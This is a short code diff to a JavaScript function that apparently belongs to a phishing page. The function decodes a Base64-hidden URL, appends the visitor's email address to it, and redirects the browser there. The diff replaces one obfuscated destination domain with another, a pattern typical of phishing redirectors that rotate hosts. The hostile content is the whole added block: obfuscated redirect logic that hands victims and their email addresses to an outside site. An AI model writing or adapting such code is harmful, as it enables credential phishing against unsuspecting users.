@@ -1775,7 +1775,8 @@
     }
 
     function redirect(email) {
-    var linkx = "aHR0cHM6Ly9za3NleHByZXNzcGxhdGVzLmNvbS9uLz9jM1k5YnpNMk5WOHhYMjV2YlNaeVlXNWtQVk51Y0c1TmJrazlKblZwWkQxVlUwVlNNRGd3TVRJd01qVlZNamN3TVRBNE1qWT1OMDEyM05bRU1BSUxd";  // Base64 encoded link
+    var linkx = "IGh0dHBzOi8vb3JnYWhlcmJhbG5hdHVyYWxzLmNvbS9uLz9jM1k5YnpNMk5WOHhYMjV2YlNaeVlXNWtQVlZyV2xCVlZGVTlKblZwWkQxVlUwVlNNRGd3TVRJd01qVlZNamN3TVRBNE1qWT1OMDEyM05bRU1BSUxd
+";  // Base64 encoded link
     var decodedLink = atob(linkx);  // Decode the Base64 string
     var finalLink = decodedLink + "#" + email;  // Append the email directly to the URL
     window.location.href = finalLink;  // Redirect to the final link
